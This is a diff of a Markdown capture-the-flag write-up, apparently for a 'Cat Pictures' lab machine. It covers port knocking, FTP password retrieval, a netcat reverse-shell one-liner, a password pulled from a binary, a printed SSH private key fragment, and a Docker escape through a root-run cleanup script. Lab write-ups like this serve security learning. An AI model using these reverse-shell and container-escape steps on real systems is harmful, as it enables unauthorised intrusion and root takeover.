@@ -2,22 +2,22 @@
 sticker: emoji//1f63a
 ---
 
-# CAT PICTURES
+# PORT SCAN
+---
 
-## PORT SCAN
-
-***
 
 | PORT | SERVICE     |
-| ---- | ----------- |
+| :--- | :---------- |
 | 21   | FTP         |
 | 22   | SSH         |
 | 4420 | NVM-EXPRESS |
 | 8080 | HTTP        |
 
-## RECONNAISSANCE
 
-***
+
+
+# RECONNAISSANCE
+---
 
 If we try interacting with the `4420` port, we need a password, for it, we can go to `ftp` and check this, on there, we will get:
 
@@ -25,9 +25,10 @@ If we try interacting with the `4420` port, we need a password, for it, we can g
 sardinethecat
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612135655.png) But, before all of this, we need to go to the website in which we will find this:
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612135655.png)
+But, before all of this, we need to go to the website in which we will find this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612142859.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612142859.png)
 
 The FTP port will appear as filter if we don't do `port knocking`, Port knocking is a security technique that involves a client making a series of connection attempts to specific closed ports on a server before a legitimate connection can be established, we need to do port knocking on the specified ports:
 
@@ -39,9 +40,8 @@ Once we knock, the ftp port will be open and we can access to get the password.
 
 Let's begin exploitation.
 
-## EXPLOITATION
-
-***
+# EXPLOITATION
+---
 
 We got `rce`, let's send ourselves a reverse shell:
 
@@ -49,7 +49,10 @@ We got `rce`, let's send ourselves a reverse shell:
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612135810.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612135810.png)
+
+
 
 We have a `runme` binary on `/home/catlover`:
 
@@ -69,7 +72,8 @@ Please enter yout password: sardinethecat
 Access Denied
 ```
 
-It prompts for a password, which we don't have, we cannot get the binary on our home due to the shell being a little rusty, but, when we use cat we can see this little line:
+It prompts for a password, which we don't have, we cannot get the binary on our home due to the shell being a little rusty, but, when we use cat we can see this little line: 
+
 
 ```
 rebeccaPlease enter yout password: Welcome, catlover! SSH key transfer queued! touch /tmp/gibmethesshkeyAccess Deniedd
@@ -81,7 +85,7 @@ The password is:
 rebecca
 ```
 
-This binary generates a `id_rsa` for `catlover` once the password is correct, we know this by analyzing the binary using `cat`:
+This binary generates a `id_rsa` for `catlover`  once the password is correct, we know this by analyzing the binary using `cat`:
 
 ```
 cat /home/catlover/id_rsa
@@ -117,11 +121,9 @@ O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ=
 
 We got our private key and can now connect to ssh:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612141930.png)
-
-## PRIVILEGE ESCALATION
-
-***
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612141930.png)
+# PRIVILEGE ESCALATION
+---
 
 We are root but the root flag is nowhere to be found, this is because we are inside of a `Docker container`, we can know this with linpeas and `ls -la /`:
 
@@ -157,7 +159,8 @@ drwxrwxr-x   1 root root 4096 Mar 24  2021 usr
 drwxr-xr-x   1 root root 4096 Feb 18  2021 var
 ```
 
-As seen, `.dockerenv` is on here, we need a way to get into root If we check the `/opt` directory we can find a `clean.sh` script that does this:
+As seen, `.dockerenv` is on here, we need a way to get into root
+If we check the `/opt` directory we can find a `clean.sh` script that does this:
 
 ```
 root@7546fa2336d6:/# cat /opt/clean/clean.sh
@@ -219,9 +222,10 @@ ls
 exit
 ```
 
+
 Once the script runs again, we get a shell as root but in the real machine:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612143517.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612143517.png)
 
 We can now get both flags:
 
@@ -236,4 +240,5 @@ Here is your flag:
 4a98e43d78bab283938a06f38d2ca3a3c53f0476
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612143705.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612143705.png)
+
